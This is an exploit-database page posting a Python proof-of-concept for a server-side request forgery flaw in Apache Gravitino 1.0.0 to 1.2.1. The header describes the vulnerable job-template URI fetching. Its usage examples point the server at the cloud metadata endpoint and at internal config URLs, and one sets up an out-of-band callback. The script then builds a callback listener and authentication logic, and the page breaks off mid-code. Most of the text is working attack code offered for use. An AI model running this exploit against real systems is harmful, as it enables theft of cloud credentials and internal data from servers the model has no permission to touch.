---
title: Apache Gravitino 1.2.1 SSRF
url: https://cxsecurity.com/issue/WLB-2026080004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-12
fetch_date: 2026-08-13T04:02:48.900265
---

# Apache Gravitino 1.2.1 SSRF

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache Gravitino 1.2.1 SSRF** **2026.08.12**  Credit:  **[Anonymous](https://cxsecurity.com/author/Anonymous/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Apache Gravitino 1.2.1 - SSRF
# Google Dork: N/A
# Date: 2026-07-13
# Exploit Author: Ajay Rajpurohit
# Vendor Homepage: https://gravitino.apache.org/
# Software Link: https://github.com/apache/gravitino
# Version: 1.0.0 - 1.2.1
# Tested on: Ubuntu 22.04 LTS
# CVE: CVE-2026-49876
#
# Description:
# A Server-Side Request Forgery (SSRF) vulnerability exists in Apache Gravitino
# versions 1.0.0 through 1.2.1. The fetchFileFromUri() method in
# JobManager.java processes URIs from job template fields (executable, scripts,
# jars, files, archives) without validating the destination. It accepts http,
# https, and ftp schemes and downloads remote content to the server's staging
# directory via FileUtils.copyURLToFile().
#
# An authenticated attacker can:
# • Register a job template with an internal/metadata URL as the executable
# • Trigger a job run, forcing the server to fetch the URL
# • Read the downloaded content from the staging directory (if accessible)
# • Use OOB callbacks for blind SSRF detection
#
# References:
# CVE Record: https://nvd.nist.gov/vuln/detail/CVE-2026-49876
# Apache Advisory: https://lists.apache.org/thread/gravitino-ssrf-advisory
# Fixing Commit: https://github.com/apache/gravitino/commit/<commit-hash>
#
# --- Reproducibility ---
#
# Prerequisites:
# 1. Apache Gravitino 1.0.0 - 1.2.1 running (default port 8090)
# 2. A valid Gravitino user account (any role with job template privileges)
# 3. Python 3.8+ with `requests` library (pip3 install requests)
#
# Setup (if testing locally):
# wget https://dlcdn.apache.org/gravitino/1.2.0/gravitino-1.2.0-bin.tar.gz
# tar xzf gravitino-1.2.0-bin.tar.gz
# cd gravitino-1.2.0-bin
# ./bin/gravitino.sh start
#
# Expected output:
# [+] Authenticated as <user>
# [+] Template 'ssrf-poc-xxxxxx' registered
# [+] Job triggered — SSRF request sent to http://127.0.0.1:8090/configs
# [+] SSRF confirmed — server fetched internal resource
#
# Usage:
# # Direct SSRF — fetch internal config
# python3 gravitino\_ssrf.py -t http://127.0.0.1:8090 -u admin -p admin \
# --url http://127.0.0.1:8090/configs
#
# # Cloud metadata (AWS IMDSv1)
# python3 gravitino\_ssrf.py -t http://target:8090 -u user -p pass \
# --url http://169.254.169.254/latest/meta-data/
#
# # Blind SSRF with OOB callback server
# python3 gravitino\_ssrf.py -t http://target:8090 -u user -p pass \
# --url http://<your-ip>:8888/callback --oob --oob-port 8888
#
# Requirements:
# pip3 install requests
#
import argparse
import base64
import http.server
import json
import random
import socketserver
import string
import sys
import threading
import time
from datetime import datetime
try:
import requests
import urllib3
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
print("[!] Missing dependency. Install: pip3 install requests")
sys.exit(1)
# ─── OOB Callback Server (blind SSRF) ──────────────────────────────────────
class CallbackHandler(http.server.BaseHTTPRequestHandler):
"""Minimal HTTP handler that logs incoming requests for blind SSRF detection."""
received = []
def log\_message(self, fmt, \*args):
return
def \_respond(self, method):
body = b""
cl = int(self.headers.get("Content-Length", 0))
if cl > 0:
body = self.rfile.read(min(cl, 4096))
entry = {
"time": datetime.now().isoformat(),
"method": method,
"path": self.path,
"source": f"{self.client\_address[0]}:{self.client\_address[1]}",
"user\_agent": self.headers.get("User-Agent", ""),
}
CallbackHandler.received.append(entry)
print(f"\n [+] OOB CALLBACK: {method} {self.path} from {entry['source']}")
print(f" User-Agent: {entry['user\_agent']}")
self.send\_response(200)
self.end\_headers()
self.wfile.write(b"OK")
do\_GET = lambda s: s.\_respond("GET")
do\_POST = lambda s: s.\_respond("POST")
do\_HEAD = lambda s: s.\_respond("HEAD")
do\_PUT = lambda s: s.\_respond("PUT")
do\_OPTIONS = lambda s: s.\_respond("OPTIONS")
def start\_oob\_server(port: int) -> None:
"""Start a background HTTP server on the given port for OOB callbacks."""
server = socketserver.TCPServer(("0.0.0.0", port), CallbackHandler)
server.allow\_reuse\_address = True
t = threading.Thread(target=server.serve\_forever, daemon=True)
t.start()
# ─── Gravitino REST Client ─────────────────────────────────────────────────
class Gravitino:
"""Minimal client for the Gravitino REST API — just enough for the PoC."""
def \_\_init\_\_(self, base\_url: str, username: str, password: str,
metalake: str = "metalake", verify: bool = False):
self.base = base\_url.rstrip("/")
self.username = username
self.password = password
self.metalake = metalake
self.s = requests.Session()
self.s.verify = verify
def login(self) -> bool:
"""Authenticate via OAuth2 token endpoint; fall back to Basic auth."""
# Try OAuth2
try:
r = self.s.post(
f"{self.base}/oauth2/token",
data={
"grant\_type": "password",
"username": self.username,
"password": self.password,
"client\_id": "gravitino\_client",
"scope": "all",
},
headers={"Content-Type": "application/x-www-form-urlencoded"},
timeout=15,
)
if r.status\_code == 200:
token = r.json().get("access\_token")
if token:
self.s.headers["Authorization"] = f"Bearer {token}"
print(f"[+] Authenticated via OAuth2 token")
return True
except Exception:
pass
# Fallback: Basic auth
creds = base64.b64encode(f"{self.username}:{self.password}".encode()).decode()
self.s.headers["Authorization"] = f"Basic {creds}"
try:
r = self.s.get(f"{self.base}/api/version", timeout=10)
if r.status\_code == 200:
print(f"[+] Authenticated via Basic auth")
return True
except Exception:
pass
print("[!] Authentication failed. Provide valid credentials (-u / -p).")
return False
def ensure\_metalake(self) -> bool:
"""Create the metalake if it doesn't exist."""
try:
r = self.s.get(f"{self.base}/api/metalakes/{self.metalake}", timeout=10)
if r.status\_code == 200:
return True
except Exception:
pass
try:
r = self.s.post(f"{self.base}/api/metalak...